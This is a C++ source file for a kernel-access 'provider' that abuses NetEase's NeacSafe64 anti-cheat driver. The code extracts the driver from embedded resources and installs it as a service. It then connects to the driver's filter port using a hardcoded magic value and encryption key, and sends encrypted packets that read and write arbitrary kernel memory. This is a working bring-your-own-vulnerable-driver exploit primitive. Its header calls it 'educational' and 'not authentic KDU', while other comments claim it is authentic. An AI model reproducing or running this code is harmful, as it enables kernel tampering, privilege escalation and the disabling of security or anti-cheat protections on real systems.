/**
 * @file NeacSafe64Provider.cpp
 * @author Gregory King
 * @date September 9, 2025
 * @brief NeacSafe64 vulnerable driver provider implementation.
 * 
 * This is a CUSTOM implementation NOT based on KDU. NeacSafe64 does not exist
 * in the official hfiref0x/KDU repository. This is an experimental filter-based
 * provider for educational purposes.
 * 
 * WARNING: This is NOT an authentic KDU implementation.
 */

#include "NeacSafe64Provider.h"
#include "../Utils.h"
#include "../Resources/DriverDataManager.h"
#include "ServiceManager.h"
#include <iostream>
#include <fltUser.h>  // WDK Filter Manager user-mode library
#include <strsafe.h>  // For StringCchPrintf
#include <filesystem>
#include <vector>

#pragma comment(lib, "fltlib.lib")  // Link with filter library

using namespace KernelMode::Providers;

// Authentic KDU encryption key and immutable data
BYTE NeacSafe64Provider::encryptionKey[33] = "FuckKeenFuckKeenFuckKeenFuckKeen";
unsigned char NeacSafe64Provider::encryptionImm[16] = {
    0x7A, 0x54, 0xE5, 0x41, 0x8B, 0xDB, 0xB0, 0x55, 0x7A, 0xBD,
    0x01, 0xBD, 0x1A, 0x7F, 0x9E, 0x17
};

ProviderLoadData NeacSafe64Provider::loadData = {
    false,                                  // PhysMemoryBruteForce
    false,                                  // PML4FromLowStub  
    false,                                  // PreferPhysical
    false,                                  // RequiresDSE
    CAPABILITY_VIRTUAL_MEMORY,              // Capabilities
    L"NetEase Anti-Cheat Service - Filter driver with virtual memory access"  // Description
};

NeacSafe64Provider::NeacSafe64Provider() : portHandle(INVALID_HANDLE_VALUE), isInitialized(false) {
    std::wcout << L"[*] NeacSafe64Provider initialized (CUSTOM implementation - NOT authentic KDU)" << std::endl;
}

NeacSafe64Provider::~NeacSafe64Provider() {
    Deinitialize();
}

bool NeacSafe64Provider::Initialize(ULONG driverId, bool bypassDSE) {
    if (isInitialized) {
        std::wcout << L"[!] NeacSafe64Provider already initialized" << std::endl;
        return true;
    }

    std::wcout << L"[*] Initializing NeacSafe64Provider using KDU methods..." << std::endl;

    // Start the vulnerable driver using authentic KDU approach
    if (!StartVulnerableDriver()) {
        std::wcerr << L"[-] Failed to start NeacSafe64 driver" << std::endl;
        return false;
    }

    // Connect to the filter driver port
    portHandle = ConnectToDriver();
    if (portHandle == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] Failed to connect to NeacSafe64 driver port" << std::endl;
        StopVulnerableDriver();
        return false;
    }

    isInitialized = true;
    std::wcout << L"[+] NeacSafe64Provider initialized successfully" << std::endl;
    return true;
}

void NeacSafe64Provider::Deinitialize() {
    if (!isInitialized) return;

    std::wcout << L"[*] Deinitializing NeacSafe64Provider..." << std::endl;

    if (portHandle != INVALID_HANDLE_VALUE) {
        CloseHandle(portHandle);
        portHandle = INVALID_HANDLE_VALUE;
    }

    StopVulnerableDriver();
    isInitialized = false;
    std::wcout << L"[+] NeacSafe64Provider deinitialized" << std::endl;
}

std::wstring NeacSafe64Provider::GetProviderName() const {
    return L"NeacSafe64 (NetEase Anti-Cheat) - Authentic KDU Implementation";
}

bool NeacSafe64Provider::ReadKernelMemory(uintptr_t address, void* buffer, size_t size) {
    if (!isInitialized || portHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    return ReadVirtualMemoryDirect(address, buffer, size);
}

bool NeacSafe64Provider::WriteKernelMemory(uintptr_t address, void* buffer, size_t size) {
    if (!isInitialized || portHandle == INVALID_HANDLE_VALUE) {
        return false;
    }

    return WriteVirtualMemoryDirect(address, buffer, size);
}

bool NeacSafe64Provider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
    // NeacSafe64 only supports virtual memory access
    static bool warned = false;
    if (!warned) {
        std::wcerr << L"[-] NeacSafe64 does not support direct physical memory access" << std::endl;
        warned = true;
    }
    return false;
}

bool NeacSafe64Provider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
    // NeacSafe64 only supports virtual memory access
    static bool warned = false;
    if (!warned) {
        std::wcerr << L"[-] NeacSafe64 does not support direct physical memory access" << std::endl;
        warned = true;
    }
    return false;
}

bool NeacSafe64Provider::BypassDSE() {
    std::wcerr << L"[-] NeacSafe64 does not support DSE bypass functionality" << std::endl;
    return false;
}

ULONG NeacSafe64Provider::GetCapabilities() const {
    return CAPABILITY_VIRTUAL_MEMORY;
}

const ProviderLoadData* NeacSafe64Provider::GetLoadData() const {
    return &loadData;
}

uintptr_t NeacSafe64Provider::VirtualToPhysical(uintptr_t virtualAddress) {
    // NeacSafe64 doesn't provide virtual-to-physical translation capability
    std::wcerr << L"[-] NeacSafe64 does not support virtual-to-physical address translation" << std::endl;
    return 0;
}

uintptr_t NeacSafe64Provider::AllocateKernelMemory(size_t size, uintptr_t* physicalAddress) {
    std::wcerr << L"[-] NeacSafe64 does not support kernel memory allocation" << std::endl;
    return 0;
}

bool NeacSafe64Provider::FreeKernelMemory(uintptr_t virtualAddress, size_t size) {
    std::wcerr << L"[-] NeacSafe64 does not support kernel memory deallocation" << std::endl;
    return false;
}

bool NeacSafe64Provider::CreateSystemThread(uintptr_t startAddress, uintptr_t parameter) {
    std::wcerr << L"[-] NeacSafe64 does not support system thread creation" << std::endl;
    return false;
}

ProviderStatus NeacSafe64Provider::ReadKernelMemoryEx(uintptr_t address, void* buffer, size_t size) {
    if (!isInitialized) {
        return PROVIDER_ERROR_DEVICE_NOT_READY;
    }
    
    bool success = ReadKernelMemory(address, buffer, size);
    return success ? PROVIDER_SUCCESS : PROVIDER_ERROR_READ_FAILED;
}

ProviderStatus NeacSafe64Provider::WriteKernelMemoryEx(uintptr_t address, void* buffer, size_t size) {
    if (!isInitialized) {
        return PROVIDER_ERROR_DEVICE_NOT_READY;
    }
    
    bool success = WriteKernelMemory(address, buffer, size);
    return success ? PROVIDER_SUCCESS : PROVIDER_ERROR_WRITE_FAILED;
}

// Authentic KDU encryption implementation (copied from KDU source)
void NeacSafe64Provider::NetEaseEncyptBuffer(unsigned int* buffer, unsigned int idx) {
    __m128i v2;
    unsigned int* result;
    int v4;
    __m128i v5;
    __m128i v8;

    __m128i imm = _mm_load_si128((__m128i*)encryptionImm);
    __m128i zero;
    memset(&zero, 0, sizeof(__m128i));
    v2 = _mm_cvtsi32_si128(idx);
    result = &v8.m128i_u32[3];
    v8 = _mm_xor_si128(
        _mm_shuffle_epi32(_mm_shufflelo_epi16(_mm_unpacklo_epi8(v2, v2), 0), 0),
        imm);
    v4 = 0;
    v5 = _mm_cvtsi32_si128(0x4070E1Fu);
    do
    {
        __m128i v6 = _mm_shufflelo_epi16(_mm_unpacklo_epi8(_mm_or_si128(_mm_cvtsi32_si128(*result), v5), zero), 27);
        v6 = _mm_packus_epi16(v6, v6);
        *buffer = (*buffer ^ ~idx) ^ v6.m128i_u32[0] ^ idx;
        ++buffer;
        result = (unsigned int*)((char*)result - 1);
        v4++;
    } while (v4 < 4);
}

void NeacSafe64Provider::NetEaseSafeEncodePayload(PBYTE key, PBYTE buffer, SIZE_T size) {
    for (int i = 0; i < size; i++) {
        buffer[i] ^= key[i & 31];
    }
    unsigned int* ptr = (unsigned int*)buffer;
    unsigned int v12 = 0;
    do
    {
        NetEaseEncyptBuffer(ptr, v12++);
        ptr += 4;
    } while (v12 < size >> 4);
}

HANDLE NeacSafe64Provider::ConnectToDriver() {
    std::wcout << L"[*] Connecting to NeacSafe64 filter port..." << std::endl;
    
    HANDLE filterPort = INVALID_HANDLE_VALUE;
    HRESULT hr;
    
    // Authentic KDU connection context structure
    NEAC_FILTER_CONNECT connectionContext = { 0 };
    connectionContext.Magic = 0x4655434B;
    connectionContext.Version = 8;
    RtlCopyMemory(connectionContext.EncKey, encryptionKey, 32);
    
    // Authentic KDU port name format: \\DeviceName
    // For NeacSafe64, this would typically be \\NeacSafePort or similar
    const wchar_t* portName = L"\\NeacSafePort";
    
    std::wcout << L"[*] Attempting to connect to filter port: " << portName << std::endl;
    
    // Use FilterConnectCommunicationPort with authentic KDU parameters
    hr = FilterConnectCommunicationPort(
        portName,                          // Port name
        FLT_PORT_FLAG_SYNC_HANDLE,        // Options (KDU uses sync handle)
        &connectionContext,                // Connection context with magic/version/key
        40,                               // Size of connection context (authentic KDU size)
        NULL,                             // Security attributes (KDU uses NULL)
        &filterPort                       // Handle to communication port
    );
    
    if (SUCCEEDED(hr) && filterPort != INVALID_HANDLE_VALUE) {
        std::wcout << L"[+] Successfully connected to NeacSafe64 filter port" << std::endl;
        return filterPort;
    } else {
        std::wcerr << L"[-] Failed to connect to NeacSafe64 filter port. HRESULT: 0x" 
                   << std::hex << hr << std::dec << std::endl;
        
        // Provide additional error information
        if (hr == HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)) {
            std::wcerr << L"[-] Filter port not found. Driver may not be loaded or port not created." << std::endl;
        } else if (hr == HRESULT_FROM_WIN32(ERROR_ACCESS_DENIED)) {
            std::wcerr << L"[-] Access denied. Try running with administrator privileges." << std::endl;
        }
        
        return INVALID_HANDLE_VALUE;
    }
}

bool NeacSafe64Provider::StartVulnerableDriver() {
    std::wcout << L"[*] Starting NeacSafe64 driver using ServiceManager..." << std::endl;

    ServiceManager serviceManager(L"NeacSafe64");
    
    // LIFECYCLE-032 FIX: Ensure driver path is set correctly relative to execution
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH)) {
        std::filesystem::path p(exePath);
        this->driverFilePath = (p.parent_path() / L"NeacSafe64.sys").wstring();
    } else {
        this->driverFilePath = L".\\NeacSafe64.sys";
    }

    if (!this->ExtractDriverFromResources(Resources::DRIVER_ID_NEACSAFE64, this->driverFilePath)) {
        std::wcerr << L"[-] Failed to extract NeacSafe64 driver from embedded resources" << std::endl;
        return false;
    }

    ServiceInfo serviceInfo = serviceManager.InstallDriverService(L"NeacSafe64", this->driverFilePath, L"NetEase Anti-Cheat Service", SERVICE_FILE_SYSTEM_DRIVER);
    if (serviceInfo.serviceName.empty()) {
        std::wcerr << L"[-] Failed to install NeacSafe64 service" << std::endl;
        DeleteFileW(this->driverFilePath.c_str());
        return false;
    }

    if (!serviceManager.StartDriverService(serviceInfo.serviceName)) {
        std::wcerr << L"[-] Failed to start NeacSafe64 service" << std::endl;
        serviceManager.RemoveService(serviceInfo.serviceName);
        DeleteFileW(this->driverFilePath.c_str());
        return false;
    }

    std::wcout << L"[+] NeacSafe64 filter driver started successfully" << std::endl;
    return true;
}

void NeacSafe64Provider::StopVulnerableDriver() {
    std::wcout << L"[*] Stopping NeacSafe64 driver using ServiceManager..." << std::endl;

    ServiceManager serviceManager(L"NeacSafe64");
    serviceManager.CleanupAllServices();

    if (!driverFilePath.empty()) {
        if (DeleteFileW(driverFilePath.c_str())) {
            std::wcout << L"[+] Driver file cleaned up: " << driverFilePath << std::endl;
        } else {
            std::wcout << L"[!] Could not delete driver file: " << driverFilePath << std::endl;
        }
        driverFilePath.clear();
    }
}

bool NeacSafe64Provider::ReadVirtualMemoryDirect(uintptr_t address, void* buffer, size_t size) {
    if (portHandle == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] NeacSafe64: No valid filter port handle" << std::endl;
        return false;
    }

    if (size > 0xFFFFFFFF) {
        std::wcerr << L"[-] NeacSafe64: Size too large for single operation" << std::endl;
        return false;
    }

    DWORD bytesReturned = 0;
    BYTE packetBuffer[16];
    NEAC_READ_PACKET* ptr = (NEAC_READ_PACKET*)packetBuffer;

    ptr->Opcode = OpCode_ReadVM;
    ptr->Src = (PVOID)address;
    ptr->Size = (DWORD)size;

    // Encrypt using authentic KDU method
    NetEaseSafeEncodePayload(encryptionKey, packetBuffer, sizeof(packetBuffer));
    
    HRESULT hr = FilterSendMessage(
        portHandle,                        // Filter communication port
        packetBuffer,                      // Input buffer (encrypted packet)
        sizeof(packetBuffer),              // Input buffer size (16 bytes)
        buffer,                            // Output buffer (where data will be read to)
        (DWORD)size,                       // Output buffer size
        &bytesReturned                     // Bytes returned
    );

    if (SUCCEEDED(hr)) {
        std::wcout << L"[+] NeacSafe64: Successfully read " << size << L" bytes from 0x" 
                   << std::hex << address << std::dec << std::endl;
        return true;
    } else {
        std::wcerr << L"[-] NeacSafe64: Memory read failed. HRESULT: 0x" 
                   << std::hex << hr << std::dec 
                   << L", BytesReturned: " << bytesReturned << std::endl;
        return false;
    }
}

bool NeacSafe64Provider::WriteVirtualMemoryDirect(uintptr_t address, void* buffer, size_t size) {
    if (portHandle == INVALID_HANDLE_VALUE) {
        std::wcerr << L"[-] NeacSafe64: No valid filter port handle" << std::endl;
        return false;
    }

    if (size > 0xFFFFFFFF) {
        std::wcerr << L"[-] NeacSafe64: Size too large for single operation" << std::endl;
        return false;
    }

    DWORD bytesReturned = 0;
    BYTE packetBuffer[32];
    NEAC_WRITE_PACKET* ptr = (NEAC_WRITE_PACKET*)packetBuffer;

    ptr->Opcode = OpCode_WriteVM;
    ptr->Dst = (PVOID)address;
    ptr->Src = buffer;
    ptr->Size = (DWORD)size;

    // Encrypt using authentic KDU method
    NetEaseSafeEncodePayload(encryptionKey, packetBuffer, sizeof(packetBuffer));
    
    HRESULT hr = FilterSendMessage(
        portHandle,                        // Filter communication port
        packetBuffer,                      // Input buffer (encrypted packet)
        sizeof(packetBuffer),              // Input buffer size (32 bytes)
        NULL,                              // Output buffer (NULL for write)
        0,                                 // Output buffer size (0 for write)
        &bytesReturned                     // Bytes returned
    );

    if (SUCCEEDED(hr)) {
        std::wcout << L"[+] NeacSafe64: Successfully wrote " << size << L" bytes to 0x" 
                   << std::hex << address << std::dec << std::endl;
        return true;
    } else {
        std::wcerr << L"[-] NeacSafe64: Memory write failed. HRESULT: 0x" 
                   << std::hex << hr << std::dec << std::endl;
        return false;
    }
}
